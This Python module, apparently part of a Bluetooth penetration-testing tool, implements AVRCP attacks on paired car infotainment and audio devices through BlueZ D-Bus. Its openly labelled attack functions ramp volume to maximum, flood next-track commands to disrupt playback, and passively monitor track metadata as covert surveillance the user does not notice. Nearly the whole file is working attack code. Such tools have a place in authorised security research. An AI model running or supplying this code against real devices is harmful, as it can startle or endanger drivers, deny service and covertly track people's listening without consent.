"""AVRCP (Audio/Video Remote Control Profile) media control attacks.

Uses D-Bus to interact with BlueZ's MediaPlayer1 and MediaTransport1
interfaces for controlling media playback on paired IVI/audio devices.

Attack capabilities:
  - Remote media control (play, pause, skip, stop)
  - Volume manipulation (ramp to max, forced level)
  - Track skip flooding (DoS media playback)
  - Metadata monitoring (passive track surveillance)

Uses ``dbus_fast`` (pure Python, pre-built wheels) instead of the legacy
``dbus-python`` + ``PyGObject`` stack so that ``pip install blue-tap``
works without any system C headers.
"""

import asyncio
import time

from blue_tap.utils.output import info, success, error, warning
from blue_tap.utils.bt_helpers import normalize_mac


BLUEZ_SERVICE = "org.bluez"
BLUEZ_MEDIA_PLAYER = "org.bluez.MediaPlayer1"
BLUEZ_MEDIA_TRANSPORT = "org.bluez.MediaTransport1"
DBUS_OBJECT_MANAGER = "org.freedesktop.DBus.ObjectManager"
DBUS_PROPERTIES = "org.freedesktop.DBus.Properties"


def _run_async(coro):
    """Run an async coroutine from sync code."""
    try:
        asyncio.get_running_loop()
    except RuntimeError:
        return asyncio.run(coro)
    # Inside a running loop — run in a new thread to avoid deadlock.
    import concurrent.futures
    with concurrent.futures.ThreadPoolExecutor(max_workers=1) as pool:
        return pool.submit(asyncio.run, coro).result()


def _variant_to_python(value):
    """Convert dbus_fast Variant to native Python type."""
    try:
        from dbus_fast import Variant
        if isinstance(value, Variant):
            return _variant_to_python(value.value)
    except ImportError:
        pass
    if isinstance(value, dict):
        return {str(k): _variant_to_python(v) for k, v in value.items()}
    if isinstance(value, list):
        return [_variant_to_python(v) for v in value]
    return value


class AVRCPController:
    """AVRCP controller for media manipulation on Bluetooth targets.

    Usage:
        avrcp = AVRCPController("AA:BB:CC:DD:EE:FF")
        avrcp.connect()
        avrcp.play()
        avrcp.volume_ramp(target=127)
        avrcp.skip_flood(count=50)
        avrcp.disconnect()
    """

    def __init__(self, address: str, hci: str = "hci0"):
        self.address = normalize_mac(address)
        self.hci = hci
        self.dbus_path = None
        self.player_candidates: list[dict] = []
        self.selected_player: dict = {}
        self._bus = None
        self._player_iface = None
        self._props_iface = None
        self._transport_props = None

    def connect(self) -> bool:
        """Connect to the BlueZ MediaPlayer1 interface via D-Bus."""
        from blue_tap.utils.bt_helpers import ensure_adapter_ready
        if not ensure_adapter_ready(self.hci, timeout=3, auto_up=False):
            error(f"Adapter {self.hci} not ready for AVRCP control")
            return False

        try:
            from dbus_fast.aio import MessageBus  # noqa: F401
        except ImportError:
            error("dbus-fast not installed. Install: pip install dbus-fast")
            return False

        if _run_async(self._async_connect()):
            return True
        # Retry once after backoff
        warning("AVRCP connection failed, retrying in 2s...")
        time.sleep(2)
        return _run_async(self._async_connect())

    async def _async_connect(self) -> bool:
        """Async implementation of D-Bus connect."""
        from dbus_fast.aio import MessageBus
        from dbus_fast import BusType

        mac_path = self.address.replace(":", "_")
        dev_prefix = f"/org/bluez/{self.hci}/dev_{mac_path}"

        try:
            self._bus = await MessageBus(bus_type=BusType.SYSTEM).connect()
            introspection = await self._bus.introspect(BLUEZ_SERVICE, "/")
            obj = self._bus.get_proxy_object(BLUEZ_SERVICE, "/", introspection)
            manager = obj.get_interface(DBUS_OBJECT_MANAGER)
            objects = await manager.call_get_managed_objects()
        except Exception as e:
            error(f"D-Bus connection failed: {e}")
            return False

        # Find MediaPlayer1 for this device
        candidates = []
        for path, interfaces in objects.items():
            if str(path).startswith(dev_prefix) and BLUEZ_MEDIA_PLAYER in interfaces:
                candidate = {"path": str(path)}
                candidate.update(
                    {
                        str(key): _variant_to_python(value)
                        for key, value in interfaces[BLUEZ_MEDIA_PLAYER].items()
                    }
                )
                candidates.append(candidate)

        if candidates:
            self.player_candidates = sorted(candidates, key=self._player_sort_key)
            # TODO: Hardware-validate the player-selection heuristic on live
            # BlueZ stacks with multiple MediaPlayer1 objects (for example
            # Spotify + OEM media sources) before treating the ranking as final.
            bind_errors = []
            for chosen in self.player_candidates:
                self.dbus_path = chosen["path"]
                try:
                    introspection = await self._bus.introspect(BLUEZ_SERVICE, self.dbus_path)
                    player_obj = self._bus.get_proxy_object(BLUEZ_SERVICE, self.dbus_path, introspection)
                    self._player_iface = player_obj.get_interface(BLUEZ_MEDIA_PLAYER)
                    self._props_iface = player_obj.get_interface(DBUS_PROPERTIES)
                    self.selected_player = dict(chosen)
                    success(f"AVRCP connected: {self.dbus_path}")
                    if len(self.player_candidates) > 1:
                        info(
                            "Selected active player: "
                            f"{chosen.get('Name', 'unknown')} ({chosen.get('Status', 'unknown')}) "
                            f"from {len(self.player_candidates)} candidate(s)"
                        )
                    break
                except Exception as e:
                    bind_errors.append(f"{self.dbus_path}: {e}")
                    self._player_iface = None
                    self._props_iface = None
            if not self._player_iface or not self._props_iface:
                error(f"Failed to get player interface: {'; '.join(bind_errors)}")
                if self._bus:
                    try:
                        self._bus.disconnect()
                    except Exception:
                        pass
                    self._bus = None
                return False

            await self._find_transport(objects, dev_prefix)
            return True

        error(f"No MediaPlayer1 found for {self.address}")
        warning("Ensure the device is paired, connected, and playing media")
        return False

    async def _find_transport(self, objects: dict, dev_prefix: str):
        """Locate the MediaTransport1 interface for volume control."""
        for path, interfaces in objects.items():
            if str(path).startswith(dev_prefix) and BLUEZ_MEDIA_TRANSPORT in interfaces:
                try:
                    introspection = await self._bus.introspect(BLUEZ_SERVICE, path)
                    transport_obj = self._bus.get_proxy_object(BLUEZ_SERVICE, path, introspection)
                    self._transport_props = transport_obj.get_interface(DBUS_PROPERTIES)
                    info(f"Media transport found: {path}")
                except Exception as e:
                    warning(f"Transport interface unavailable: {e}")

    def disconnect(self):
        """Disconnect from the BlueZ MediaPlayer1 interface."""
        if self._bus:
            self._bus.disconnect()
        self._player_iface = None
        self._props_iface = None
        self._transport_props = None
        self._bus = None
        self.dbus_path = None
        self.player_candidates = []
        self.selected_player = {}
        info("AVRCP disconnected")

    # ========================================================================
    # Transport Controls
    # ========================================================================

    def play(self) -> bool:
        """Send Play command."""
        return self._call_player("play", "Play sent")

    def pause(self) -> bool:
        """Send Pause command."""
        return self._call_player("pause", "Pause sent")

    def stop(self) -> bool:
        """Send Stop command."""
        return self._call_player("stop", "Stop sent")

    def next_track(self) -> bool:
        """Send Next track command."""
        return self._call_player("next", "Next track")

    def previous_track(self) -> bool:
        """Send Previous track command."""
        return self._call_player("previous", "Previous track")

    def _call_player(self, method: str, msg: str) -> bool:
        """Call a method on the MediaPlayer1 interface."""
        if not self._player_iface:
            error("Not connected - call connect() first")
            return False
        try:
            _run_async(getattr(self._player_iface, f"call_{method}")())
            success(msg)
            return True
        except Exception as e:
            error(f"{method} failed: {e}")
            return False

    # ========================================================================
    # Properties
    # ========================================================================

    def get_track_info(self) -> dict:
        """Read current track metadata (Title, Artist, Album, Duration, etc)."""
        if not self._props_iface:
            error("Not connected")
            return {}
        try:
            track = _run_async(
                self._props_iface.call_get(BLUEZ_MEDIA_PLAYER, "Track")
            )
            result = _variant_to_python(track)
            if isinstance(result, dict):
                info(f"Track: {result.get('Artist', '?')} - {result.get('Title', '?')}")
                return result
            return {}
        except Exception as e:
            error(f"Failed to read track info: {e}")
            return {}

    def get_status(self) -> str:
        """Read playback status (playing, paused, stopped, etc)."""
        if not self._props_iface:
            error("Not connected")
            return ""
        try:
            status = _run_async(
                self._props_iface.call_get(BLUEZ_MEDIA_PLAYER, "Status")
            )
            result = str(_variant_to_python(status))
            info(f"Status: {result}")
            return result
        except Exception as e:
            error(f"Failed to read status: {e}")
            return ""

    def set_volume(self, level: int) -> bool:
        """Set absolute volume via MediaTransport1 (0-127)."""
        level = max(0, min(127, level))
        if not self._transport_props:
            error("No media transport available for volume control")
            return False
        try:
            from dbus_fast import Variant
            _run_async(
                self._transport_props.call_set(
                    BLUEZ_MEDIA_TRANSPORT, "Volume", Variant("q", level),
                )
            )
            success(f"Volume set to {level}/127")
            return True
        except Exception as e:
            error(f"Volume set failed: {e}")
            return False

    # ========================================================================
    # Attack Functions
    # ========================================================================

    def get_player_info(self) -> dict:
        """Get info about the active media player app.

        The Name property often reveals which app is active:
        'Spotify', 'FM Radio', 'USB Music', 'Bluetooth Audio', etc.

        This is passive surveillance -- user doesn't see any indication.
        """
        if not self._props_iface:
            error("Not connected")
            return {}
        try:
            result = {}
            for prop in ("Name", "Type", "Subtype", "Status", "Position", "Browsable", "Searchable"):
                try:
                    val = _run_async(
                        self._props_iface.call_get(BLUEZ_MEDIA_PLAYER, prop)
                    )
                    result[prop] = _variant_to_python(val)
                except Exception:
                    pass
            if result.get("Name"):
                info(f"Active player: {result['Name']} ({result.get('Status', '?')})")
            return result
        except Exception as e:
            error(f"Failed to get player info: {e}")
            return {}

    def get_metadata_snapshot(self) -> dict:
        """Return a consolidated snapshot of player, track, and settings."""
        track = self.get_track_info()
        status = self.get_status()
        player = self.get_player_info()
        settings = self.get_player_settings()
        return {
            "status": status,
            "track": track,
            "player": player,
            "settings": settings,
            "active_app": player.get("Name", ""),
            "selection": self.get_selection_diagnostics(),
        }

    def get_selection_diagnostics(self) -> dict:
        """Expose which player candidate was selected and why."""
        selected = self.selected_player or (self.player_candidates[0] if self.player_candidates else {})
        return {
            "selected_path": self.dbus_path or "",
            "candidate_count": len(self.player_candidates),
            "selected_name": selected.get("Name", ""),
            "selected_status": selected.get("Status", ""),
            "candidates": [
                {
                    "path": item.get("path", ""),
                    "name": item.get("Name", ""),
                    "status": item.get("Status", ""),
                    "browsable": item.get("Browsable"),
                    "searchable": item.get("Searchable"),
                }
                for item in self.player_candidates
            ],
        }

    def get_player_settings(self) -> dict:
        """Read player application settings (equalizer, repeat, shuffle)."""
        if not self._props_iface:
            return {}
        try:
            result = {}
            for prop in ("Equalizer", "Repeat", "Shuffle", "Scan"):
                try:
                    val = _run_async(
                        self._props_iface.call_get(BLUEZ_MEDIA_PLAYER, prop)
                    )
                    result[prop] = _variant_to_python(val)
                except Exception:
                    pass
            if result:
                info(f"Player settings: {result}")
            return result
        except Exception as e:
            warning(f"Could not read player settings: {e}")
            return {}

    def set_repeat(self, mode: str) -> bool:
        """Set repeat mode: 'off', 'singletrack', 'alltracks', 'group'."""
        return self._set_player_setting("Repeat", mode)

    def set_shuffle(self, mode: str) -> bool:
        """Set shuffle mode: 'off', 'alltracks', 'group'."""
        return self._set_player_setting("Shuffle", mode)

    def _set_player_setting(self, prop: str, value: str) -> bool:
        """Set a player application setting via D-Bus."""
        if not self._props_iface:
            error("Not connected")
            return False
        try:
            from dbus_fast import Variant
            _run_async(
                self._props_iface.call_set(
                    BLUEZ_MEDIA_PLAYER, prop, Variant("s", value),
                )
            )
            success(f"Set {prop} = {value}")
            return True
        except Exception as e:
            error(f"Failed to set {prop}: {e}")
            return False

    def fast_forward(self) -> bool:
        """Send FastForward command."""
        return self._call_player("fast_forward", "Fast forward")

    def rewind(self) -> bool:
        """Send Rewind command."""
        return self._call_player("rewind", "Rewind")

    def volume_ramp(self, start: int = 0, target: int = 127, step_ms: int = 100) -> bool:
        """Gradually ramp volume from start to target."""
        start = max(0, min(127, start))
        target = max(0, min(127, target))
        info(f"Volume ramp: {start} -> {target} (step {step_ms}ms)")
        delay = step_ms / 1000.0

        if not self.set_volume(start):
            return False

        if start < target:
            vol_range = range(start + 1, target + 1)
        elif start > target:
            vol_range = range(start - 1, target - 1, -1)
        else:
            return True  # Already at target

        for level in vol_range:
            if not self.set_volume(level):
                warning(f"Volume ramp failed at level {level}")
                return False
            time.sleep(delay)

        success(f"Volume ramp complete: {start} → {target}")
        return True

    def skip_flood(self, count: int = 100, interval_ms: int = 100) -> bool:
        """Rapidly send Next Track commands to disrupt media playback."""
        info(f"Skip flood: {count} skips @ {interval_ms}ms interval")
        return _run_async(self._async_skip_flood(count, interval_ms))

    async def _async_skip_flood(self, count: int, interval_ms: int) -> bool:
        """Async skip flood — single event loop for all skips."""
        interval_ms = max(10, interval_ms)  # Prevent CPU spin on zero/sub-ms
        delay = interval_ms / 1000.0
        sent = 0
        for i in range(count):
            if not self._player_iface:
                error("Connection lost during flood")
                break
            try:
                await self._player_iface.call_next()
                sent += 1
            except Exception as e:
                warning(f"Skip {i+1} failed: {e}")
            await asyncio.sleep(delay)

        success(f"Skip flood complete: {sent}/{count} sent")
        return sent > 0

    def monitor_metadata(self, duration: int = 300, callback=None) -> None:
        """Monitor track changes via D-Bus PropertiesChanged signal.

        Watches for metadata updates on MediaPlayer1 for passive
        surveillance of what the target is listening to.
        """
        try:
            from dbus_fast.aio import MessageBus  # noqa: F401
        except ImportError:
            error("dbus-fast not installed; cannot monitor metadata")
            return

        info(f"Monitoring metadata for {duration}s...")
        _run_async(self._async_monitor(duration, callback))

    async def _async_monitor(self, duration: int, callback) -> None:
        """Async metadata monitoring via PropertiesChanged signal."""
        from dbus_fast.aio import MessageBus
        from dbus_fast import BusType, Message, MessageType

        if not self.dbus_path:
            warning("No player path - monitoring requires connect() first")
            return

        bus = await MessageBus(bus_type=BusType.SYSTEM).connect()

        # Subscribe to PropertiesChanged signals on the player's D-Bus path.
        # dbus_fast uses bus.add_message_handler() + AddMatch rules.
        match_rule = (
            f"type='signal',"
            f"interface='{DBUS_PROPERTIES}',"
            f"member='PropertiesChanged',"
            f"path='{self.dbus_path}'"
        )
        await bus.call(
            Message(
                destination="org.freedesktop.DBus",
                path="/org/freedesktop/DBus",
                interface="org.freedesktop.DBus",
                member="AddMatch",
                signature="s",
                body=[match_rule],
            )
        )

        def message_handler(msg: Message) -> bool:
            if (
                msg.message_type != MessageType.SIGNAL
                or msg.member != "PropertiesChanged"
                or msg.path != self.dbus_path
            ):
                return False

            # PropertiesChanged body: (interface, changed_props, invalidated)
            body = msg.body
            if not body or len(body) < 2:
                return False

            interface = body[0]
            if interface != BLUEZ_MEDIA_PLAYER:
                return False

            changed = _variant_to_python(body[1])
            if "Track" in changed:
                track = changed["Track"]
                if isinstance(track, dict):
                    artist = track.get("Artist", "Unknown")
                    title = track.get("Title", "Unknown")
                    info(f"Track changed: {artist} - {title}")
                if callback:
                    callback(changed)
            if "Status" in changed:
                info(f"Status changed: {changed['Status']}")
            return True

        bus.add_message_handler(message_handler)

        try:
            await asyncio.sleep(duration)
        except asyncio.CancelledError:
            pass
        finally:
            bus.remove_message_handler(message_handler)
            bus.disconnect()
            success("Metadata monitoring stopped")

    @staticmethod
    def _player_sort_key(candidate: dict) -> tuple[int, int, int, str]:
        status = str(candidate.get("Status", "")).lower()
        name = str(candidate.get("Name", ""))
        return (
            0 if status == "playing" else 1 if status == "paused" else 2,
            0 if name else 1,
            0 if candidate.get("Browsable") else 1,
            str(candidate.get("path", "")),
        )
